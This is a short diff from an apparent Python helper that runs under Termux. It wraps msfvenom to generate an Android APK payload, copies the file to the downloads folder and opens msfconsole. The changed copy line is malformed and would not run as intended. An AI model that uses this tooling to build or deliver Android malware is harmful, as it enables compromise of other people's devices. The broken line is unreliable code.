@@ -20,7 +20,7 @@ def payload():
         os.system("msfconsole")
     elif Android_payload == "second":
         os.system(msfvenom_sentence)
-        os.system("cp "+apk_name+" /data/data/com.termux/files/home/storage/downloads")
+        os.system("cp "+apk_name,'.apk'+" /data/data/com.termux/files/home/storage/downloads")
         os.system("msfconsole")
     else:
         print("Wrong syntax")
